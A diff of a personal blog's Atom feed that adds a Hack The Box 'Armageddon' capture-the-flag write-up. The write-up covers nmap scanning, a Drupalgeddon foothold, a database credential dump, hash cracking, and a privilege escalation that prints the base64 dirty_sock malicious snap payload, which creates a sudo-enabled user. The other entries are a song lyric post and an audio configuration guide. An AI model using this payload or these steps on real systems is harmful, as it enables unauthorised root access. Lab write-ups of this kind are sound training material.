@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" hreflang="en" /><updated>2021-04-17T13:23:47+00:00</updated><id>/feed.xml</id><title type="html">Ybenel</title><subtitle>Where Knowledge is peace of cake.</subtitle><author><name>Ybenel</name></author><entry><title type="html">Special Lyrics</title><link href="/rawan/2021/04/17/Nawar.html" rel="alternate" type="text/html" title="Special Lyrics" /><published>2021-04-17T00:00:00+00:00</published><updated>2021-04-17T00:00:00+00:00</updated><id>/rawan/2021/04/17/Nawar</id><content type="html" xml:base="/rawan/2021/04/17/Nawar.html">&lt;h3 id=&quot;special-lyrics-to-someone-special-&quot;&gt;Special Lyrics To Someone special .&lt;/h3&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" hreflang="en" /><updated>2021-05-13T21:45:18+00:00</updated><id>/feed.xml</id><title type="html">Ybenel</title><subtitle>Where Knowledge is peace of cake.</subtitle><author><name>Ybenel</name></author><entry><title type="html">Special Lyrics</title><link href="/rawan/2021/04/17/Nawar.html" rel="alternate" type="text/html" title="Special Lyrics" /><published>2021-04-17T00:00:00+00:00</published><updated>2021-04-17T00:00:00+00:00</updated><id>/rawan/2021/04/17/Nawar</id><content type="html" xml:base="/rawan/2021/04/17/Nawar.html">&lt;h3 id=&quot;special-lyrics-to-someone-special-&quot;&gt;Special Lyrics To Someone special .&lt;/h3&gt;
 
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;I Saw Your Pretty Face
 When passing by in the street
@@ -14,12 +14,186 @@ i started wondering
 what life had planned for me.
 i began thinking
 but most of all, my love,
-i dream't of life with you.
+i dream&apos;t of life with you.
 Every morning i wake up 
 to your smile 
 i cannot help but wish 
 it will one day be true.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>[&quot;ybenel&quot;]</name></author><category term="Rawan" /><category term="song" /><category term="sound" /><category term="lyrics" /><category term="crush" /><summary type="html">Special Lyrics To Someone special .</summary></entry><entry><title type="html">HTB - Delivery</title><link href="/htb/2021/01/10/HTB-Delivery.html" rel="alternate" type="text/html" title="HTB - Delivery" /><published>2021-01-10T00:00:00+01:00</published><updated>2021-01-10T00:00:00+01:00</updated><id>/htb/2021/01/10/HTB-Delivery</id><content type="html" xml:base="/htb/2021/01/10/HTB-Delivery.html">&lt;p&gt;Delivery Easy Box By Ippsec&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>[&quot;ybenel&quot;]</name></author><category term="Rawan" /><category term="song" /><category term="sound" /><category term="lyrics" /><category term="crush" /><summary type="html">Special Lyrics To Someone special .</summary></entry><entry><title type="html">HTB - Armageddon</title><link href="/htb/2021/03/27/HTB-Armageddon.html" rel="alternate" type="text/html" title="HTB - Armageddon" /><published>2021-03-27T00:00:00+01:00</published><updated>2021-03-27T00:00:00+01:00</updated><id>/htb/2021/03/27/HTB-Armageddon</id><content type="html" xml:base="/htb/2021/03/27/HTB-Armageddon.html">&lt;p&gt;Armageddon Easy Box By bertolis, that consists of basic identification of old unpatched web framework that is vulnerable to a remote code execution exploit, and little enumeration and database dump with password cracking and the wrong use of sudo permissions (terms).&lt;/p&gt;
+
+&lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;We start of with an intense full port scan with nmap.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;span class=&quot;c&quot;&gt;# Nmap 7.91 scan initiated Sat Mar 27 16:47:39 2021 as: nmap -p- --min-rate 10000 -v -oN full_port.nmap 10.129.100.170&lt;/span&gt;
+Increasing send delay &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.129.100.170 from 0 to 5 due to 55 out of 183 dropped probes since last increase.
+Warning: 10.129.100.170 giving up on port because retransmission cap hit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Increasing send delay &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.129.100.170 from 640 to 1000 due to 110 out of 366 dropped probes since last increase.
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;armageddon.htb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.129.100.170&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.098s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 40576 closed ports, 24958 filtered ports
+PORT   STATE SERVICE
+80/tcp open  http
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Then we run another nmap scan to identify what version/service ports are running on.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Nmap 7.91 scan initiated Sat Mar 27 16:48:56 2021 as: nmap -sC -sV -p80 -oN scan.nmap 10.129.100.170&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;armageddon.htb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.129.100.170&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.070s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.6 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;CentOS&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; PHP/5.4.16&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-generator: Drupal 7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://drupal.org&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| http-robots.txt: 36 disallowed entries &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;15 shown&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| /includes/ /misc/ /modules/ /profiles/ /scripts/
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
+|_/LICENSE.txt /MAINTAINERS.txt
+|_http-server-header: Apache/2.4.6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CentOS&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; PHP/5.4.16
+|_http-title: Welcome to  Armageddon |  Armageddon
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Nmap Identifies Port 80 To be running drupal 7 which is an old version and possibly surfring from many RCE’s Exploits .&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/arma/exploits.png&quot; alt=&quot;searchsploit_exploits&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;foothold&quot;&gt;Foothold&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;Checking Exploits that &lt;strong&gt;searchploit&lt;/strong&gt; showed and from the name of the box it looks like the drupal installation is highly vulnerable to Drupalgeddon2/3 , further tho running &lt;strong&gt;Metasploit&lt;/strong&gt; to launch the exploit.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/arma/metasploit1.png&quot; alt=&quot;metasploit1&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;After Few Moments.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/arma/msf_worked.png&quot; alt=&quot;msf_worked1&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;user-enumeration&quot;&gt;User Enumeration&lt;/h4&gt;
+&lt;ul&gt;
+  &lt;li&gt;After Getting A foothold on the machine i tried spawning another shell to get a full tty shell ,however the following error is giving .&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/arma/no_tty.png&quot; alt=&quot;no_revshell&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;This concludes that the there’s some sort of firewall blocking it or there’s restrictions that don’t allow such outcoming connections like sandboxed programs in this case apache?.&lt;/li&gt;
+  &lt;li&gt;However there’s an allowed connection at port 4444&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/arma/rev_shell.png&quot; alt=&quot;rev_shell&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Yet trying to spawn a tty results into another issue which confirms this a sandboxed environment .&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/arma/sandboxed.png&quot; alt=&quot;sandboxed_box&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Let’s get &lt;strong&gt;linpeas&lt;/strong&gt; and run it, PS: Since this is a restricted environment we cannot make files executable or get them with any port unless 80.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/arma/linpeas.png&quot; alt=&quot;linpeas_start&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Linpeas did find drupal Mysql password&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/arma/linpeas2.png&quot; alt=&quot;finding_mysql_creds&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Let’s check the full file [/var/www/html/sites/default/settings.php] for mysql username And Password.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/arma/creds_mysql.png&quot; alt=&quot;creds_mysql&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Sweet , now let’s connect to mysql and dump what juicy stuff it holds .&lt;/li&gt;
+  &lt;li&gt;Reminder, I had issues connecting to mysql directly with mysql client however i did a betterway to get the content of mysql database through mysqldump.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/arma/mysql_dump.png&quot; alt=&quot;mysql_dump&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;now i can just download it and cat it or import it to my own mysql server.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/arma/dump_view.png&quot; alt=&quot;dump_view&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;we can see that’s there’s the user &lt;strong&gt;brucetherealadmin&lt;/strong&gt; which is a local user , let’s crack its hash and try to ssh with it.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/arma/crack_hash.png&quot; alt=&quot;brute_pass_crack&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Great it’s cracked , Now let’s try to ssh into &lt;strong&gt;Bruce&lt;/strong&gt; and read the &lt;strong&gt;user.txt&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/arma/get_user.png&quot; alt=&quot;get_user&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;
+&lt;h3 id=&quot;initial-recon&quot;&gt;Initial Recon&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;After we got into user &lt;strong&gt;bruce&lt;/strong&gt; let’s see if he has any sudo permissions,terms whatever .&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/arma/sudo_int.png&quot; alt=&quot;sudo_terms&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Looks like he (&lt;strong&gt;bruce&lt;/strong&gt;) can install snap packages , This is really interesting .&lt;/li&gt;
+  &lt;li&gt;Let’s create a crafted snap package and install it simply it will be just a setuid binary packaged in snap that will get us root , otherway is by overwritten the content of /etc/passwd by adding a root user to it that will can ssh to …. , there’s alot of way tho.&lt;/li&gt;
+  &lt;li&gt;There’s few exploits that were made for snapd that allowed installation of malicious crafted snaps , however we don’t need to run those exploits because this version of snap is patched and we have root privileges to install any snap package.&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;So In Order To Create a snap package i had to install an ubuntu vm cuz i’m running arch based os, so i cheated a bit and i didn’t want to run a vm so i used a prepacked snaps from those exploits &lt;a href=&quot;https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py&quot;&gt;link&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;i decoded the base64 and wrote it to a file using python
+    &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&apos;&apos;
+aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/
+/////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh
+ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5
+TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERo
+T2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawpl
+Y2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFt
+ZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZv
+ciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5n
+L2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZt
+b2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAe
+rFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUj
+rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA
+AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2
+XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5
+RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA
+AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw&apos;&apos;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;A&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4256&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;==&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b64decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;crafted.snap&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;wb&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Then downloaded the file and installed it .&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/arma/inst_run.png&quot; alt=&quot;inst_run&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Now let’s su to the dirty_sock user we added to /etc/passwd and read the root flag.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/arma/read_root.png&quot; alt=&quot;read_root&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And That’s it , that’s &lt;strong&gt;Armageddon&lt;/strong&gt; hope you enjoyed the writeup take care and i’ll see you all other time.&lt;/p&gt;</content><author><name>[&quot;ybenel&quot;]</name></author><category term="HTB" /><category term="HTB" /><category term="Medium" /><category term="Easy" /><summary type="html">Armageddon Easy Box By bertolis, that consists of basic identification of old unpatched web framework that is vulnerable to a remote code execution exploit, and little enumeration and database dump with password cracking and the wrong use of sudo permissions (terms).</summary></entry><entry><title type="html">HTB - Delivery</title><link href="/htb/2021/01/10/HTB-Delivery.html" rel="alternate" type="text/html" title="HTB - Delivery" /><published>2021-01-10T00:00:00+01:00</published><updated>2021-01-10T00:00:00+01:00</updated><id>/htb/2021/01/10/HTB-Delivery</id><content type="html" xml:base="/htb/2021/01/10/HTB-Delivery.html">&lt;p&gt;Delivery Easy Box By Ippsec&lt;/p&gt;
 
 &lt;h2 id=&quot;foothold&quot;&gt;Foothold&lt;/h2&gt;
 &lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;
@@ -37,7 +211,7 @@ We can see there’s 3 ports open.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/delivery/pic26.png&quot; alt=&quot;Static_Contact&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;We can see a note from the site owner?&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;For unregistered users, please use our HelpDesk to get in touch with our team. Once you have an @delivery.htb email address, you'll be able to have access to our MatterMost server
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;For unregistered users, please use our HelpDesk to get in touch with our team. Once you have an @delivery.htb email address, you&apos;ll be able to have access to our MatterMost server
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;so let’s look at the helpdisk at helpdesk.delivery.htb&lt;/p&gt;
 
@@ -60,7 +234,7 @@ Hmmm there must be somewhere around it . let’s check the open ticket thing .&l
 
 &lt;p&gt;We Get Support ticket request created with a ticket id and an email ?
 At this point i was hmmmmmmmmmmmm an email , going back to the text we got earlier&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Once you have an @delivery.htb email address, you'll be able to have access to our MatterMost server
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Once you have an @delivery.htb email address, you&apos;ll be able to have access to our MatterMost server
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;Now before we go and create an account at mattermost let’s check out ticket status.&lt;/p&gt;
 
@@ -266,7 +440,7 @@ Now this will test if our device has 8 channel output (7.1) or 6 channel output 
 &lt;h3 id=&quot;understanding-the-config&quot;&gt;understanding the config&lt;/h3&gt;
 &lt;h4 id=&quot;default-sample-format&quot;&gt;default-sample-format&lt;/h4&gt;
 &lt;ul&gt;
-  &lt;li&gt;is sampling format it depends on the endianness of the cpu, to check your cpu byte order &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lscpu | grep 'Byte Order'&lt;/code&gt; if it’s little endian just live the config as it is , if it’s big endian replace float32le with float32be.
+  &lt;li&gt;is sampling format it depends on the endianness of the cpu, to check your cpu byte order &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lscpu | grep &apos;Byte Order&apos;&lt;/code&gt; if it’s little endian just live the config as it is , if it’s big endian replace float32le with float32be.
     &lt;h4 id=&quot;default-sample-rate&quot;&gt;default-sample-rate&lt;/h4&gt;
   &lt;/li&gt;
   &lt;li&gt;is the sample frequency , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;alternate-sample-rate&lt;/code&gt; the alternate sample frequency. Sinks and sources will use either the default-sample-rate value or this alternate value, typically 44.1 or 48kHz.
@@ -362,7 +536,7 @@ load-module module-virtual-surround-sink &lt;span class=&quot;nv&quot;&gt;hrir&l
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;c&quot;&gt;#Kill pulse audio&lt;/span&gt;
 pulseaudio &lt;span class=&quot;nt&quot;&gt;--kill&lt;/span&gt;
-  &lt;span class=&quot;c&quot;&gt;#In case pulse audio didn't start&lt;/span&gt;
+  &lt;span class=&quot;c&quot;&gt;#In case pulse audio didn&apos;t start&lt;/span&gt;
 pulseaudio &lt;span class=&quot;nt&quot;&gt;--start&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
